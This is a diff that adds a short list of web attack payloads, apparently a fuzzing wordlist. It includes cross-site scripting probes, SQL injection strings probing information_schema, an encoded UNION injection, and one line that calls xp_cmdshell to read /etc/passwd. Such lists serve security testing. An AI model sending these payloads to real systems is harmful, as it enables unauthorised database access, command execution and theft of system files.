@@ -1,0 +1,11 @@
+<frameset><frame src=\"javascript:alert('XSS');\"></frameset>
+ AND 1=1 ORDERBY(1,2,3,4,5) --;
+><script>alert("testing");</script>
+ AND 1=1 UNION ALL SELECT 1,NULL,1,'<script>alert(\"666\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+<img src="javascript:alert(\'XSS\');">
+'))) AND 1=1,SELECT * FROM information_schema.tables ((('
+' )) AND 1=1 (( ' -- rgzd
+;SELECT * FROM information_schema.tables WHERE 2>1 AND 1=1 OR 2=2 -- qdEf '
+' OR '1'=1 '", " OR 1=1
+<scri<script>pt>alert('123');</scri</script>pt>
+CAT1_GALLERY_1+UNION+ALL+SELECT+%28SELECT+CAST%28CHAR%28114%29%2BCHAR%2851%29%2BCHAR%28100%29%2BCHAR%28109%29%2BCHAR%2848%29%2BCHAR%28118%29%2BCHAR%2851%29%2BCHAR%2895%29%2BCHAR%28104%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%2895%29%2BCHAR%28105%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%28101%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28111%29%2BCHAR%28110%29+AS+NVARCHAR%284000%29%29%29%2CNULL--
